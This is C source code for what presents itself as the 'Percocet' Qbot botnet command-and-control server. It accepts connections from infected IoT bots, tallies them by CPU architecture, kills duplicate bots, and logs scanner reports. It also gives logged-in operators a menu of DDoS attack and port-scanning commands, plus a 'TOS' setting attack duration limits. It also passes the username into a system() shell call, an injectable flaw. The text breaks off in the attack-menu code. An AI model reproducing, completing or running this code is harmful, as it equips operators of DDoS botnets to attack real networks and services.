//Percocet
#include "Includes/Includes.h"
#include "Includes/Resolver.h"
#define MAXFDS 1000000
#define PercocetPR 10

int adminstatus;

struct login_info {
	char username[200];
	char password[200];
	char type[200];
};
///////////////////////////////////////
static struct login_info accounts[10];
//////////////////////////////////////
struct clientdata_t {
        uint32_t ip;
        char connected;
        char build[7];
		char arch[30];
} clients[MAXFDS];
//////////////////////////
unsigned int MIPS = 0;
unsigned int MIPSEL = 0;
unsigned int ARM4 = 0;
unsigned int ARM5 = 0;
unsigned int ARM6 = 0;
unsigned int ARM7 = 0;
unsigned int X86 = 0;
unsigned int PPC = 0;
unsigned int SUPERH = 0;
unsigned int M68K = 0;
unsigned int SPARC = 0;
unsigned int UNKNOWN = 0;
/////////////////////////
struct telnetdata_t {
    int connected;
    char ip[16];
    int adminstatus;
	int API;
	int Reg;
	char nickname[20];
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
struct telnetListenerArgs {
	int sock;
	uint32_t ip;
};
int input_argc = 0;
char *input_argv[PercocetPR + 1] = { 0 };
void Split_Str(char *strr){
    int i = 0;
    for (i = 0; i < input_argc; i++)
        input_argv[i] = NULL;
    input_argc = 0;
    char *token = strtok(strr, " ");
    while (token != NULL && input_argc < PercocetPR){
        input_argv[input_argc++] = malloc(strlen(token) + 1);
        strcpy(input_argv[input_argc - 1], token);
        token = strtok(NULL, " ");
    }
}

FILE *LogFile2;
FILE *LogFile3;


static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile FILE *ticket;
static volatile FILE *staff;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
const char *get_host(uint32_t addr)
{
	struct in_addr in_addr_ip;
	in_addr_ip.s_addr = addr;
	return inet_ntoa(in_addr_ip);
}

void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;31m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strstr(buf, "Corona")||strstr(buf, "corona")||strstr(buf, "CORONA")||strstr(buf, "Build")||strstr(buf, "BUILD")||strstr(buf, "build")) {close(datafd);}
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
                    else if(strstr(buf, "arch ") != NULL){
                    //char *arch = strtok(buf, " ")+sizeof(arch)-3;
                        char *arch = strstr(buf, "arch ") + 5;
                        strcpy(clients->arch, arch);
                        strcpy(clients[datafd].arch, arch);
                        printf(" \e[38;5;201mIp:\x1b[38;5;202m %s \x1b[1;35m| \e[38;5;201mArch: \x1b[38;5;202m%s\n", get_host(/*clients[datafd].ip*/client->ip), arch);
                        /*char k[60];
                        sprintf(k, "echo '%s' >> /root/Logs/Bot_Connections.log", Get_Host(client->ip));*/
                    }
				}
				//printf("%s", buf);
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			    if (done) {
			    //printf("\e[38;5;201mDisconnected Ip:\x1b[38;5;202m %s\n", get_host(/*clients[datafd].ip*/client->ip));
				client->connected = 0;
				close(datafd);
				}
				}
			}
		}
	}
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void countArch(){
    int x;
    for(x = 0; x < MAXFDS; x++){
        if(strstr(clients[x].arch, "mips") && clients[x].connected == 1)
            MIPS++;
        else if(strstr(clients[x].arch, "mipsel") || strstr(clients[x].arch, "mpsl") && clients[x].connected == 1)
            MIPSEL++;
        else if(strstr(clients[x].arch, "armv4") && clients[x].connected == 1)
            ARM4++;
        else if(strstr(clients[x].arch, "armv5") && clients[x].connected == 1)
            ARM5++;
        else if(strstr(clients[x].arch, "armv6") && clients[x].connected == 1)
            ARM6++;
        else if(strstr(clients[x].arch, "armv7") && clients[x].connected == 1)
            ARM6++;
        else if(strstr(clients[x].arch, "x86") && clients[x].connected == 1)
            X86++;
        else if(strstr(clients[x].arch, "powerpc") && clients[x].connected == 1)
            PPC++;
        else if(strstr(clients[x].arch, "sh4") && clients[x].connected == 1)
            SUPERH++;
        else if(strstr(clients[x].arch, "m68k") && clients[x].connected == 1)
            M68K++;
        else if(strstr(clients[x].arch, "sparc") && clients[x].connected == 1)
            SPARC++;
        else if(strstr(clients[x].arch, "unknown") && clients[x].connected == 1)
            UNKNOWN++;
    }
}
void *TitleWriter(void *sock) 
{
	int datafd = (int)sock;
    char string[2048];
    while(1) 
    {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; | %d | Bots | Users Online: %d | %c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(3);
		}
}		        
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("Users.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *arguments, char *argv[], void *sock)
{ 
	struct telnetListenerArgs *args = arguments;
    char username[80];
    int datafd = (int)args->sock;
    const char *management_ip = get_host(args->ip);
    //printf("%s\n", management_ip);  
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* usernames;
	char* passwords;
	char botnet[2048];
	char botcount [2048];
	char statuscount [2048];
	char input [5000];
	int req_args = 0;

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("Users.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s", accounts[j].username, accounts[j].password, accounts[j].type);
		++j;
	}

    char login[25][1024];
    char string[2048];
    sprintf(string, "%c]0; Percocet Login %c", '\033', '\007');
    if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
    sprintf(login[1],  "\e[38;5;201mWelcome To The \x1b[38;5;202mProject Percocet \e[38;5;201mQbot\x1b[0m\r\n");
    sprintf(login[2],  "\e[38;5;201mPlease Enter Your Login \x1b[38;5;202mInformation\x1b[0m\r\n"); 
    sprintf(login[3],  "\x1b[0m\r\n");

	int h;
	for(h =0;h<21;h++)
	if(send(datafd, login[h], strlen(login[h]), MSG_NOSIGNAL) == -1) goto end;
	char clearscreen [2048];
	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[1A");
	char user [5000];	
	
    sprintf(user, "\e[38;5;201mUsername\x1b[38;5;202m:\x1b[0;30m ");
	
	if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
	char* nickstring;
	sprintf(accounts[find_line].username, buf);
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    if(strcmp(nickstring, accounts[find_line].username) == 0){
	char password [5000];
    sprintf(password, "\e[38;5;201mPassword\x1b[38;5;202m:\x1b[0;30m ", accounts[find_line].password);
	if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
	
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

    trim(buf);
    if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
	goto Banner;
    }
     failed:
    if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
    char *kkkkkkk = "\x1b[31mError, Incorrect Login Credentials. Your Ip Has Been Logged!\x1b[0m\r\n";
    if(send(datafd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1) goto end;
    FILE *logFile;
    logFile = fopen("/root/Logs/failed_attempts.log", "a");
    fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
    printf("\x1b[1;31mFailed Login Attempt \x1b[1;36m(\x1b[1;31m%s\x1b[1;36m)\n", management_ip);
    fclose(logFile);
    memset(buf, 0, 2048);
    goto end;
	Banner:

	pthread_create(&title, NULL, &TitleWriter, datafd);
	char ascii_banner_line1   [5000];
	char ascii_banner_line2   [5000];
	char ascii_banner_line3   [5000];
	char ascii_banner_line4   [5000];
	char ascii_banner_line5   [5000];
	char ascii_banner_line6   [5000];
	char ascii_banner_line7   [5000];
	char ascii_banner_line8   [5000];
	char ascii_banner_line9   [5000];
    char *hahalaughnow[60];
    char *userlog  [800];

    sprintf(managements[datafd].nickname, "%s", accounts[find_line].username);
    sprintf(hahalaughnow, "echo '%s Has Logged In | Ip: %s' >> /root/Logs/client_connections.log", accounts[find_line].username, management_ip);
    system(hahalaughnow);
    if(!strcmp(accounts[find_line].type, "admin")){
        managements[datafd].adminstatus = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\e[38;5;201mUser \x1b[38;5;202m%s \e[38;5;201mHas Logged In \x1b[38;5;202m| \e[38;5;201mAccount Type\x1b[38;5;202m:\e[38;5;201m Admin\x1b[0m\n", accounts[find_line].username);
	}
		if(!strcmp(accounts[find_line].type, "Reg")){
        managements[datafd].Reg = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\e[38;5;201mUser \x1b[38;5;202m%s \e[38;5;201mHas Logged In \x1b[38;5;202m| \e[38;5;201mAccount Type\x1b[38;5;202m:\e[38;5;201m Regular\x1b[38;5;202m |\e[38;5;201m Users Ip\x1b[38;5;202m:\e[38;5;201m %s \x1b[0m\n", accounts[find_line].username, management_ip);
    }	
	snprintf(managements[datafd].ip, sizeof(managements[datafd].ip), "%s", management_ip);
	sprintf(clearscreen, "\033[2J\033[1;1H");
    sprintf(ascii_banner_line1,  "\e[0m\r\n");
    sprintf(ascii_banner_line2,  "\e[0m                                                                                     \r\n");
    sprintf(ascii_banner_line3,  "\e[0m    \e[38;5;93m▄▄▄\e[0m·\e[38;5;93m▄▄▄ \e[0m.\e[38;5;93m▄▄▄   ▄▄\e[0m·    \e[0m•   \e[38;5;93m▄▄\e[0m· \e[38;5;93m▄▄▄ \e[0/m.\e[38;5;93m▄▄▄▄▄  \e[38;5;201m| \e[38;5;93mType \e[38;5;202mhelp \e[38;5;93mfor \e[38;5;202mhelp    \r\n");
    sprintf(ascii_banner_line4,  "\e[0m   \e[38;5;93m▐█ ▄█▀▄\e[0m.\e[38;5;93m▀\e[0m·\e[38;5;93m▀▄ █\e[0m·\e[38;5;93m▐█ ▌       ▐█ ▌▪▀▄.▀\e[0m·•\e[38;5;93m██    \e[38;5;201m| \e[38;5;93mEnjoy!! \r\n");
    sprintf(ascii_banner_line5,  "\e[0m    \e[38;5;93m██▀\e[0m·\e[38;5;93m▐▀▀▪▄▐▀▀▄ ██ ▄▄ ▄█▀▄ ██ ▄▄▐▀▀▪▄ ▐█\e[0m.\e[38;5;93m▪  \e[38;5;201m| \e[38;5;93mBy\e[38;5;202m: \e[1;32mbean#3233-𝙘𝙧𝙚𝙚𝙙-24#1636   \r\n");
    sprintf(ascii_banner_line6,  "\e[0m   \e[38;5;93m▐█\e[0m▪·•\e[38;5;93m▐█▄▄▌▐█\e[0m•\e[38;5;93m█▌▐███▌▐█▌\e[0m.\e[38;5;93m▐▌▐███▌▐█▄▄▌ ▐█▌\e[0m·  \e[38;5;201m| \e[38;5;93mOS\e[38;5;202m: \e[1;32mCentos 6.9\r\n");
    sprintf(ascii_banner_line7,  "\e[0m   \e[38;5;93m\e[0m.\e[38;5;93m▀    ▀▀▀ \e[0m.\e[38;5;93m▀  ▀\e[0m·\e[38;5;93m▀▀▀  ▀█▄▀\e[0m▪·\e[38;5;93m▀▀▀  ▀▀▀  ▀▀▀   \e[38;5;201m| \e[38;5;93mPercocet \e[38;5;202mRedone \e[38;5;93mCNC\r\n");
    sprintf(ascii_banner_line8,  "\e[0m                        \e[38;5;93mv\e[38;5;201m2.0                          \r\n");
    sprintf(ascii_banner_line9,  "\e[0m                                     \r\n");

	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;

        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {  
        if(strstr(buf, "Help") || strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?")) {
				sprintf(botnet,  "\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;5;202mtos  \e[38;5;201mShows The TOS             \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;5;202mbots \e[38;5;201mShows All Bots Connected           \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;5;202mattk  \e[38;5;201mShows DDoS Commands          \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;5;202madmin \e[38;5;201mShows Admin Commands  \x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;5;202muserinfo \e[38;5;201mShows Your Account Information\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}	
        else if(strstr(buf, "userinfo") || strstr(buf, "USERINFO") || strstr(buf, "uinfo")) {                
                sprintf(botnet,  "\x1b[38;5;202m\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201mUsername\x1b[38;5;202m:\e[38;5;201m %s\x1b[0m\r\n", accounts[find_line].username);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201mIp Address\x1b[38;5;202m:\e[38;5;201m %s\x1b[0m\r\n", management_ip);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201mAccount Type\x1b[38;5;202m:\e[38;5;201m %s\x1b[0m\r\n", accounts[find_line].type);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
				
			if(strstr(buf, "BOTS") || strstr(buf, "Bots") || strstr(buf, "bots")) {
				countArch();
				char botcount [2048];
				char bcount[1024];
				memset(botcount, 0, 2048);
                if(MIPS != 0){
                    sprintf(bcount, "\e[38;5;201mMips: \x1b[38;5;202m%d\r\n\x1b[0m", MIPS);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(MIPSEL != 0){
				sprintf(bcount, "\e[38;5;201mMipsel: \x1b[38;5;202m%d\r\n\x1b[0m", MIPSEL);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM4 != 0){
				sprintf(bcount, "\e[38;5;201mArm4: \x1b[38;5;202m%d\r\n\x1b[0m", ARM4);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM5 != 0){
				sprintf(bcount, "\e[38;5;201mArm5: \x1b[38;5;202m%d\r\n\x1b[0m", ARM5);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM6 != 0){
				sprintf(bcount, "\e[38;5;201mArm6: \x1b[38;5;202m%d\r\n\x1b[0m", ARM6);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM7 != 0){
				sprintf(bcount, "\e[38;5;201mArm7: \x1b[38;5;202m%d\r\n\x1b[0m", ARM7);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(X86 != 0){
				sprintf(bcount, "\e[38;5;201mx86: \x1b[38;5;202m%d\r\n\x1b[0m", X86);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(PPC != 0){
				sprintf(bcount, "\e[38;5;201mPpc: \x1b[38;5;202m%d\r\n\x1b[0m", PPC);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(M68K != 0){
				sprintf(bcount, "\e[38;5;201mM68k: \x1b[38;5;202m%d\r\n\x1b[0m", M68K);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(SPARC != 0){
				sprintf(bcount, "\e[38;5;201mSparc: \x1b[38;5;202m%d\r\n\x1b[0m", SPARC);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(UNKNOWN != 0){
				sprintf(bcount, "\e[38;5;201mUnknown Arch: \x1b[38;5;202m%d\r\n\x1b[0m", UNKNOWN);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                MIPS = 0;
                MIPSEL = 0;
                ARM4 = 0;
                ARM5 = 0;
                ARM6 = 0;
                ARM7 = 0;
                X86 = 0;
                PPC = 0;
                SUPERH = 0;
                M68K = 0;
                SPARC = 0;
                UNKNOWN = 0;
				sprintf(botcount,    "\e[38;5;201mBots Connected: \x1b[38;5;202m%d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
					if(strstr(buf, "TOS") || strstr(buf, "Tos") || strstr(buf, "tos")) {                
                sprintf(botnet,  "\x1b[38;5;202m\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;5;202m Username:\x1b[1;33m %s\x1b[0m\r\n", accounts[find_line].username);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m If you get in \x1b[1;33mtrouble\e[38;5;201m Its on \x1b[1;33myou not me\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m No attacking 5 ips an hour and hitting Gov Sites is Strictly \x1b[1;33mProhibited!\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m No Attacking for more than 600 seconds Strictly \x1b[1;33mProhibited!\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m Login Sharing Is \x1b[1;33mStrictly Prohibited!\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201mThis Source Was Made BY:\x1b[1;33mbean#3233-𝙘𝙧𝙚𝙚𝙙-24#1636 \e[38;5;201mNo One Else\x1b[0m\r\n");                                         
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m Contact The Owner \x1b[1;33mbean#3233-𝙘𝙧𝙚𝙚𝙙-24#1636\e[38;5;201m If You Forgot Your Login\x1b[0m\r\n");                
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m Breaking Any Rule Results In A \x1b[1;31mPermanent Ban!\x1b[0m\r\n"); 
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);

		sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, ".ToSDFols") || strstr(buf, ".TOOdkdskLS") || strstr(buf, ".tooFDs")) {                
                sprintf(botnet,  "\x1b[38;5;202m\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m.IPLOOKUP \x1b[38;5;202m[\e[38;5;201mHost\x1b[38;5;202m]\x1b[0m\r\n", accounts[find_line].username);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m.PORTSCAN \x1b[38;5;202m[\e[38;5;201mHOST\x1b[38;5;202m]\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201m.RESOLVER \x1b[38;5;202m[\e[38;5;201mHOST\x1b[38;5;202m]\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
		
 		if(strstr(buf, ".attsadask") || strstr(buf, ".ATcdscaTK") || strstr(buf, ".atssstack") || strstr(buf, ".ssxdxATTACK")) { 		  
            sprintf(botnet, "\e[38;5;201m.HOME \x1b[38;5;202mTakes You To The Home/Spoofed Methods\r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
